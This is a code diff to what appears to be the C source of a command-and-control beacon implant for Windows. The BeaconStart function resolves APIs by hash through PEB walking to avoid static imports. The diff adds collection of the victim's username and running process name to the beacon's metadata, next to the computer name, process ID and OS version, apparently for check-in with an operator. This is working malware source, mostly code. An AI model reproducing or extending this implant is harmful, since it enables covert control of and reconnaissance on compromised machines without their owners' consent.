@@ -26,27 +26,33 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 {
 	BEACON_INSTANCE Ins           = { 0 };
 	UCHAR           Str[MAX_PATH] = { 0 };
+	PVOID           K32           =   0;
+	PVOID           Ntl           =   0;
 	PVOID           Ptr           =   0;
 
-	if ((Ptr = PebGetModule( H_KERNEL32 )) != NULL) 
+	K32 = PebGetModule( H_KERNEL32 );
+	Ntl = PebGetModule( H_NTDLL );
+
+	if ( K32 != NULL && Ntl != NULL ) 
 	{
-		Ins.api.GetACP              = PeGetFuncEat( Ptr, H_GETACP );
-		Ins.api.GetOEMCP            = PeGetFuncEat( Ptr, H_GETOEMCP );
-		Ins.api.LocalLock           = PeGetFuncEat( Ptr, H_LOCALLOCK );
-		Ins.api.LocalFree           = PeGetFuncEat( Ptr, H_LOCALFREE );
-		Ins.api.LocalSize           = PeGetFuncEat( Ptr, H_LOCALSIZE );
-		Ins.api.LocalAlloc          = PeGetFuncEat( Ptr, H_LOCALALLOC );
-		Ins.api.CloseHandle         = PeGetFuncEat( Ptr, H_CLOSEHANDLE );
-		Ins.api.FreeLibrary         = PeGetFuncEat( Ptr, H_FREELIBRARY );
-		Ins.api.LocalUnlock         = PeGetFuncEat( Ptr, H_LOCALUNLOCK );
-		Ins.api.LocalReAlloc        = PeGetFuncEat( Ptr, H_LOCALREALLOC );
-		Ins.api.LoadLibraryA        = PeGetFuncEat( Ptr, H_LOADLIBRARYA );
-		Ins.api.GetTickCount        = PeGetFuncEat( Ptr, H_GETTICKCOUNT );
-		Ins.api.GetComputerNameA    = PeGetFuncEat( Ptr, H_GETCOMPUTERNAMEA );
-		Ins.api.GetCurrentProcessId = PeGetFuncEat( Ptr, H_GETCURRENTPROCESSID );
-	
-		Ptr = PebGetModule( H_NTDLL );
-		Ins.api.RtlRandomEx = PeGetFuncEat( Ptr, H_RTLRANDOMEX );
+		Ins.api.wcslen              = PeGetFuncEat( Ntl, H_WCSLEN );
+		Ins.api.GetACP              = PeGetFuncEat( K32, H_GETACP );
+		Ins.api.wcsrchr             = PeGetFuncEat( Ntl, H_WCSRCHR );
+		Ins.api.wcstombs            = PeGetFuncEat( Ntl, H_WCSTOMBS );
+		Ins.api.GetOEMCP            = PeGetFuncEat( K32, H_GETOEMCP );
+		Ins.api.LocalLock           = PeGetFuncEat( K32, H_LOCALLOCK );
+		Ins.api.LocalFree           = PeGetFuncEat( K32, H_LOCALFREE );
+		Ins.api.LocalSize           = PeGetFuncEat( K32, H_LOCALSIZE );
+		Ins.api.LocalAlloc          = PeGetFuncEat( K32, H_LOCALALLOC );
+		Ins.api.CloseHandle         = PeGetFuncEat( K32, H_CLOSEHANDLE );
+		Ins.api.FreeLibrary         = PeGetFuncEat( K32, H_FREELIBRARY );
+		Ins.api.LocalUnlock         = PeGetFuncEat( K32, H_LOCALUNLOCK );
+		Ins.api.RtlRandomEx         = PeGetFuncEat( Ntl, H_RTLRANDOMEX );
+		Ins.api.LocalReAlloc        = PeGetFuncEat( K32, H_LOCALREALLOC );
+		Ins.api.LoadLibraryA        = PeGetFuncEat( K32, H_LOADLIBRARYA );
+		Ins.api.GetTickCount        = PeGetFuncEat( K32, H_GETTICKCOUNT );
+		Ins.api.GetComputerNameA    = PeGetFuncEat( K32, H_GETCOMPUTERNAMEA );
+		Ins.api.GetCurrentProcessId = PeGetFuncEat( K32, H_GETCURRENTPROCESSID );
 
 		Str[0x0] = 'c';
 		Str[0x1] = 'r';
@@ -92,6 +98,7 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 		Ins.api.CryptDestroyHash     = PeGetFuncEat( Ins.Module[1], H_CRYPTDESTROYHASH );
 		Ins.api.CryptSetKeyParam     = PeGetFuncEat( Ins.Module[1], H_CRYPTSETKEYPARAM );
 		Ins.api.CryptGetHashParam    = PeGetFuncEat( Ins.Module[1], H_CRYPTGETHASHPARAM );
+		Ins.api.LookupAccountSidA    = PeGetFuncEat( Ins.Module[1], H_LOOKUPACCOUNTSIDA );
 		Ins.api.CryptReleaseContext  = PeGetFuncEat( Ins.Module[1], H_CRYPTRELEASECONTEXT );
 		Ins.api.GetTokenInformation  = PeGetFuncEat( Ins.Module[1], H_GETTOKENINFORMATION );
 		Ins.api.CryptAcquireContextA = PeGetFuncEat( Ins.Module[1], H_CRYPTACQUIRECONTEXTA );
@@ -147,30 +154,41 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 						PBEACON_METADATA_HDR Met = 0;
 						PVOID                Cmp = 0;
 						PVOID                Usr = 0;
-						PVOID                Prc = 0;
+						PVOID                Exe = 0;
 
 						if ((Cmp = BeaconComputer( &Ins )))
 						{
-							Met = BufferCreate( &Ins, sizeof( BEACON_METADATA_HDR ) );
-							Met = BufferAddRaw( &Ins, Met, Str, 16 );
-							Met = BufferAddUI1( &Ins, Met, Ins.api.GetACP() );
-							Met = BufferAddUI1( &Ins, Met, Ins.api.GetOEMCP() );
-							Met = BufferAddUI4( &Ins, Met, HTONL(Ins.BeaconId) );
-							Met = BufferAddUI4( &Ins, Met, HTONL(Ins.api.GetCurrentProcessId()) );
-							Met = BufferAddUI2( &Ins, Met, 0 );
-							Met = BufferAddUI1( &Ins, Met, 2 | 4 );
-							Met = BufferAddUI1( &Ins, Met, NtCurrentTeb()->ProcessEnvironmentBlock->OSMajorVersion );
-							Met = BufferAddUI1( &Ins, Met, NtCurrentTeb()->ProcessEnvironmentBlock->OSMinorVersion );
-							Met = BufferAddUI2( &Ins, Met, NtCurrentTeb()->ProcessEnvironmentBlock->OSBuildNumber );
-							Met = BufferAddUI4( &Ins, Met, 0x0 );
-							Met = BufferAddUI4( &Ins, Met, 0x0 );
-							Met = BufferAddUI4( &Ins, Met, 0x0 );
-							Met = BufferAddUI4( &Ins, Met, 0x0 );
-							Met = BufferAddRaw( &Ins, Met, Cmp, strlen(Cmp) );
-							Met = BufferAddUI1( &Ins, Met, '\t' );
+							if ((Usr = BeaconUsername( &Ins )))
+							{
+								if ((Exe = BeaconProcess( &Ins )))
+								{
+									Met = BufferCreate( &Ins, sizeof( BEACON_METADATA_HDR ) );
+									Met = BufferAddRaw( &Ins, Met, Str, 16 );
+									Met = BufferAddUI1( &Ins, Met, Ins.api.GetACP() );
+									Met = BufferAddUI1( &Ins, Met, Ins.api.GetOEMCP() );
+									Met = BufferAddUI4( &Ins, Met, HTONL( Ins.BeaconId ) );
+									Met = BufferAddUI4( &Ins, Met, HTONL( Ins.api.GetCurrentProcessId() ) );
+									Met = BufferAddUI2( &Ins, Met, 0 );
+									Met = BufferAddUI1( &Ins, Met, 2 | 4 );
+									Met = BufferAddUI1( &Ins, Met, NtCurrentTeb()->ProcessEnvironmentBlock->OSMajorVersion );
+									Met = BufferAddUI1( &Ins, Met, NtCurrentTeb()->ProcessEnvironmentBlock->OSMinorVersion );
+									Met = BufferAddUI2( &Ins, Met, HTONS( NtCurrentTeb()->ProcessEnvironmentBlock->OSBuildNumber ) );
+									Met = BufferAddUI4( &Ins, Met, 0x0 );
+									Met = BufferAddUI4( &Ins, Met, 0x0 );
+									Met = BufferAddUI4( &Ins, Met, 0x0 );
+									Met = BufferAddUI4( &Ins, Met, 0x0 );
+									Met = BufferAddRaw( &Ins, Met, Cmp, strlen( Cmp ) );
+									Met = BufferAddUI1( &Ins, Met, '\t' );
+									Met = BufferAddRaw( &Ins, Met, Usr, strlen( Usr ) );
+									Met = BufferAddUI1( &Ins, Met, '\t' );
+									Met = BufferAddRaw( &Ins, Met, Exe, strlen( Exe ) );
 
+									Ins.api.LocalFree( Exe );
+									Ins.api.LocalFree( Met );
+								};
+								Ins.api.LocalFree( Usr );
+							};
 							Ins.api.LocalFree( Cmp );
-							Ins.api.LocalFree( Met );
 						};
 					};
 				};
